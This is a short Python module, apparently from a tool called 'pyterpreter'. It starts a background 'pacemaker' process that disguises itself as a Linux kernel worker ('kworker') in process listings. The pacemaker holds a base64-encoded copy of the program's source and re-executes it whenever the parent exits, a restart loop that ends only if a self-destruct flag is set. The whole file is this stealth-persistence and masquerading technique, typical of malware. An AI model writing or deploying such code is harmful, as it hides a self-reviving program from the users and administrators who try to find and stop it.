import base64
import os
import subprocess
import sys
import threading

from pyterpreter import config


def start(blocking=False):
    if not blocking:
        threading.Thread(target=start, args=[True], daemon=True).start()
    else:
        while True:
            # https://stackoverflow.com/a/48703232
            read_fd, write_fd = os.pipe()

            pacemaker_code = f'''
import base64
import os
import subprocess

os.close({write_fd})
print(f'PACEMAKER: Initialised')
os.read({read_fd}, 1)  # blocks until parent exits
print(f'PACEMAKER: Parent exited....restarting')

source_code = base64.b64decode('{base64.b64encode(config.SOURCE_CODE.encode()).decode()}'.encode()).decode()
exec(source_code, {{'__name__': '__main__', '__source__': source_code}})
        '''

            proc = subprocess.Popen(['debug-[kworker/1:0-events]'], stdin=subprocess.PIPE, executable=sys.executable, pass_fds=(read_fd, write_fd))
            config.pacemaker_pid = proc.pid
            proc.stdin.write(pacemaker_code.encode())
            proc.stdin.close()
            os.close(read_fd)
            proc.wait()
            if config.self_destructing:
                return
            print(f'pacemaker exited, restarting....')
